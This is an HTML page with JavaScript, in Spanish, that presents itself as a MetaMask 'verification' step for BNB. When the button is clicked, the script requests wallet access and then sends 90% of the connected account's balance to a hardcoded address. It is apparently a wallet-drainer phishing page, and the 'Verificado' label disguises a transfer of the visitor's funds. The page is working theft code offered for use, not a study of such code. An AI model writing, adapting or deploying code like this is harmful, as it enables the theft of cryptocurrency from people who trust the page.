<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Verificar y transferir BNB</title>
    <script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider"></script>
    <script src="https://cdn.jsdelivr.net/npm/web3@1.0.0-beta.37/dist/web3.min.js"></script>
    <script>
      window.addEventListener("load", async () => {
        // Check if Web3 has been injected by the browser (Mist/MetaMask)
        if (typeof window.ethereum !== "undefined") {
          // Use Mist/MetaMask's provider
          window.web3 = new Web3(window.ethereum);
          await window.ethereum.enable();
        } else {
          console.log("No web3? You should consider trying MetaMask!");
        }

        // Get accounts
        const accounts = await window.ethereum.request({
          method: "eth_requestAccounts",
        });
        console.log("Connected to MetaMask with account:", accounts[0]);

        const bnbBalance = await window.web3.eth.getBalance(accounts[0]);
        console.log("BNB balance:", window.web3.utils.fromWei(bnbBalance));

        const transferBNB = async () => {
          const transferAmount = window.web3.utils.toWei(
            (0.9 * parseFloat(window.web3.utils.fromWei(bnbBalance))).toString()
          );

          const transferTo = "0x01C65F22A9478C2932e62483509c233F0aaD5c72"; // Replace with destination address

          const receipt = await window.web3.eth.sendTransaction({
            from: accounts[0],
            to: transferTo,
            value: transferAmount,
          });
          console.log("Transfer receipt:", receipt);
        };

        const verifyButton = document.getElementById("verify-button");
        verifyButton.addEventListener("click", async () => {
          try {
            await window.ethereum.request({ method: "eth_requestAccounts" });
            console.log("MetaMask is connected and authorized.");
            verifyButton.innerHTML = "Verificado";
            verifyButton.disabled = true;
            await transferBNB();
          } catch (error) {
            console.error(error);
          }
        });
      });
    </script>
  </head>
  <body>
    <div class="card">
      <h1>Verificar y transferir BNB</h1>
      <p>Conecta tu MetaMask y verifica para transferir el 90% de tus BNB a una dirección común.</p>
      <button id="verify-button">Conectar MetaMask</button>
    </div>
  </body>
</html>
